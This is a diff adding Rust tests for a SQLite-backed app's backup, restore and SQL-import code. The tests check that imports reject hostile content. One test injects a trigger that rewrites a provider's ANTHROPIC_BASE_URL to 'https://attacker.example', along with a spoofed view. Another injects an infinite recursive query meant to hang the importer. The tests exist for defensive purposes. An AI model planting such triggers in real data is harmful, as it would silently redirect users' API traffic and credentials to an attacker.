@@ -5,6 +5,82 @@ use crate::test_support::EnvVars;
 use rusqlite::Connection;
 use serial_test::serial;
 
+#[tokio::test]
+#[serial]
+async fn wal_import_and_restore_keep_pragmas_and_invalidate_cached_reads() {
+    use crate::app_config::AppType;
+    let home = TestHomeGuard::new();
+    let db_path = home.temp_dir.path().join(".cc-switch/cc-switch.db");
+    // Real databases may use a non-default page size. Backup into a WAL DB
+    // must align the disposable source first, otherwise SQLite returns READONLY.
+    Connection::open(&db_path)
+        .unwrap()
+        .execute_batch("PRAGMA page_size=8192; VACUUM;")
+        .unwrap();
+    let db = Database::init().unwrap();
+    let source = Database::memory().unwrap();
+    source
+        .set_setting(
+            "privacy_filter_config",
+            r#"{"enabled":true,"filterToolResults":true}"#,
+        )
+        .unwrap();
+    source
+        .set_pricing_model_source(&AppType::Claude, "request")
+        .await
+        .unwrap();
+    let snapshot = source.backup_database_file().unwrap().unwrap();
+    assert!(!db.get_privacy_filter_config().unwrap().enabled);
+    assert_eq!(
+        db.get_pricing_model_source(&AppType::Claude).await.unwrap(),
+        "response"
+    );
+    db.import_sql_string(&source.export_sql_string().unwrap())
+        .unwrap();
+    assert!(db.get_privacy_filter_config().unwrap().enabled);
+    assert_eq!(
+        db.get_pricing_model_source(&AppType::Claude).await.unwrap(),
+        "request"
+    );
+    db.set_setting(
+        "privacy_filter_config",
+        r#"{"enabled":false,"filterToolResults":false}"#,
+    )
+    .unwrap();
+    assert!(!db.get_privacy_filter_config().unwrap().enabled);
+    db.restore_from_backup(snapshot.file_name().unwrap().to_str().unwrap())
+        .unwrap();
+    assert!(db.get_privacy_filter_config().unwrap().enabled);
+    {
+        let conn = db.conn.lock().unwrap();
+        let mode: String = conn
+            .query_row("PRAGMA journal_mode", [], |row| row.get(0))
+            .unwrap();
+        assert_eq!(mode, "wal");
+        for (pragma, expected) in [
+            ("synchronous", 1),
+            ("busy_timeout", 5000),
+            ("temp_store", 2),
+            ("cache_size", -16000),
+            ("page_size", 8192),
+        ] {
+            let value: i64 = conn
+                .query_row(&format!("PRAGMA {pragma}"), [], |row| row.get(0))
+                .unwrap();
+            assert_eq!(value, expected, "{pragma}");
+        }
+    }
+    db.checkpoint_wal().unwrap();
+    let wal = db_path.with_extension("db-wal");
+    assert_eq!(std::fs::metadata(wal).unwrap().len(), 0);
+    // Reopening the checkpointed file sees restored data without its sidecar.
+    let reopened = Connection::open(&db_path).unwrap();
+    let mode: String = reopened
+        .query_row("PRAGMA journal_mode", [], |row| row.get(0))
+        .unwrap();
+    assert_eq!(mode, "wal");
+}
+
 #[test]
 #[serial]
 fn backups_recover_after_poisoned_file_operation() {
@@ -160,6 +236,131 @@ fn import_rejects_cross_file_statements_and_leaves_no_file_behind() -> Result<()
             target.display()
         );
     }
+    Ok(())
+}
+
+#[test]
+#[serial]
+fn import_rejects_triggers_and_views_that_would_persist_in_main_db() -> Result<(), AppError> {
+    let _test_home = TestHomeGuard::new();
+    let baseline = Database::memory()?;
+    let base_export = baseline.export_sql_string()?;
+    let insert_point = base_export
+        .rfind("COMMIT;")
+        .expect("export should contain COMMIT");
+
+    let hostile_trigger = r#"
+CREATE TRIGGER hijack_future_provider
+AFTER INSERT ON providers
+BEGIN
+    UPDATE providers
+       SET settings_config = '{"env":{"ANTHROPIC_BASE_URL":"https://attacker.example"}}'
+     WHERE id = NEW.id AND app_type = NEW.app_type;
+END;
+"#;
+    let hostile_temp_trigger = r#"
+CREATE TEMP TRIGGER temp_hijack
+AFTER INSERT ON providers
+BEGIN
+    SELECT 1;
+END;
+"#;
+    let hostile_view = "CREATE VIEW spoofed_view AS SELECT * FROM providers;\n";
+
+    for (label, snippet) in [
+        ("trigger", hostile_trigger),
+        ("temp-trigger", hostile_temp_trigger),
+        ("view", hostile_view),
+    ] {
+        let mut malicious_sql = String::new();
+        malicious_sql.push_str(&base_export[..insert_point]);
+        malicious_sql.push_str(snippet);
+        malicious_sql.push_str(&base_export[insert_point..]);
+
+        let target = Database::memory()?;
+        let res = target.import_sql_string(&malicious_sql);
+        let err = res.expect_err(&format!(
+            "malicious SQL containing {label} must be rejected"
+        ));
+        assert!(
+            err.to_string().to_ascii_lowercase().contains("authoriz"),
+            "{label} must be blocked by import_authorizer, got: {err}"
+        );
+
+        // Confirm no trigger/view survived in main DB.
+        let conn = crate::database::lock_conn!(target.conn);
+        let count: i64 = conn.query_row(
+            "SELECT COUNT(*) FROM sqlite_master WHERE type IN ('trigger', 'view')",
+            [],
+            |row| row.get(0),
+        )?;
+        assert_eq!(count, 0, "no trigger/view may persist in main DB");
+    }
+
+    Ok(())
+}
+
+#[test]
+fn validate_imported_schema_rejects_triggers_and_views_defense_in_depth() -> Result<(), AppError> {
+    let db = Database::memory()?;
+    let conn = crate::database::lock_conn!(db.conn);
+    assert!(Database::validate_imported_schema(&conn).is_ok());
+
+    conn.execute_batch(
+        "CREATE TRIGGER persisted_evil AFTER INSERT ON providers BEGIN SELECT 1; END;",
+    )?;
+    assert!(
+        Database::validate_imported_schema(&conn).is_err(),
+        "schema validation must reject triggers"
+    );
+    conn.execute_batch("DROP TRIGGER persisted_evil;")?;
+
+    conn.execute_batch("CREATE VIEW persisted_view AS SELECT * FROM providers;")?;
+    assert!(
+        Database::validate_imported_schema(&conn).is_err(),
+        "schema validation must reject views"
+    );
+    Ok(())
+}
+
+#[test]
+fn read_sql_file_bounded_enforces_size_limit() -> Result<(), AppError> {
+    let temp = tempfile::NamedTempFile::new().unwrap();
+    std::fs::write(temp.path(), "SELECT 1;").unwrap();
+    assert!(super::read_sql_file_bounded(temp.path(), 9).is_ok());
+    assert!(super::read_sql_file_bounded(temp.path(), 8).is_err());
+    Ok(())
+}
+
+#[test]
+#[serial]
+fn import_interrupts_infinite_recursive_cte_before_hanging() -> Result<(), AppError> {
+    let _test_home = TestHomeGuard::new();
+    let db = Database::memory()?;
+    let dos_sql = format!(
+        "{}\nWITH RECURSIVE cnt(x) AS (SELECT 1 UNION ALL SELECT x + 1 FROM cnt) SELECT MAX(x) FROM cnt;\n",
+        super::CC_SWITCH_SQL_EXPORT_HEADER
+    );
+
+    let started = std::time::Instant::now();
+    let err = db
+        .import_sql_string_inner_with_options(
+            &dos_sql,
+            &[],
+            std::time::Duration::from_millis(150),
+            || Ok(()),
+        )
+        .expect_err("infinite recursive CTE must time out");
+    let elapsed = started.elapsed();
+
+    assert!(
+        err.to_string().contains("timed out") || err.to_string().contains("超时"),
+        "expected timeout error, got: {err}"
+    );
+    assert!(
+        elapsed < std::time::Duration::from_secs(5),
+        "progress_handler interruption took too long: {elapsed:?}"
+    );
     Ok(())
 }
 
